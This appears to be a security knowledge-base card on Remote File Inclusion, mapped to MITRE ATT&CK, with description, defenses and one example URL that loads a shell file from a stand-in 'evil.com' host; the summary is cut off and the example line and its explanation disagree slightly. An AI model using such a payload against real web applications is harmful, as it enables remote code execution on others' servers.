---
id: 55e4312f-ac9a-4ec2-a926-7f74bb1911da
name: Basic RFI using Remote File Inclusion
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:55:58.182364+00:00'
updated_at: '2023-04-10T20:22:15.571541+00:00'
tactics:
- '[[Initial Access|TA0001 - Initial Access]]'
techniques:
- '[[Exploit Public-Facing Application|T1190 - Exploit Public-Facing Application]]'
tags:
- '[[Basic RFI]]'
- '[[File Inclusion]]'
---

# Basic RFI using Remote File Inclusion

## Summary

Basic RFI using Remote File Inclusion (RFI) is an attack that allows an attacker to include a remote file on a website. This technique can be used to execute arbitrary code on the web server, such as uploading a web shell. The attack relies on the web application including user-controllable input i

## Description

# Description

Basic RFI using Remote File Inclusion (RFI) is an attack that allows an attacker to include a remote file on a website. This technique can be used to execute arbitrary code on the web server, such as uploading a web shell. The attack relies on the web application including user-controllable input in a file path without proper input validation. This vulnerability can be exploited to bypass access controls and gain unauthorized access to sensitive data stored on the server. 

Technical Explanation: The attacker crafts a URL that includes a remote file, which is then included in the web application. The web application does not properly validate the user input, allowing the attacker to include arbitrary code. The attacker can then execute this code on the server, gaining access to sensitive data or taking control of the system.

Business Value: This attack can be used to gain unauthorized access to sensitive data stored on the server. This can result in financial loss, reputation damage, and legal consequences. It is important for organizations to implement proper input validation and access controls to prevent this type of attack.

 

## Requirements

1. Access to the vulnerable web application

 

## Defense

1. Implement proper input validation and access controls to prevent this type of attack.

1. Regularly scan web applications for vulnerabilities and apply security patches in a timely manner.

1. Monitor web server logs for suspicious activity and investigate any anomalies.

 

## Objectives

1. Gain unauthorized access to sensitive data stored on the server

 

# Instructions

1. 

 



**Code**: [[http://example.com/index.php?page=http://evil.com/]]



> - 'http://example.com/index.php?page=' is the vulnerable parameter that allows the attacker to include a remote file.
- 'http://evil.com/shell.txt' is the remote file that the attacker wants to include. The file contains the code that the attacker wants to execute on the server.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access|TA0001 - Initial Access]]

### Techniques

- [[Exploit Public-Facing Application|T1190 - Exploit Public-Facing Application]]

## Tags

- [[Basic RFI]]
- [[File Inclusion]]


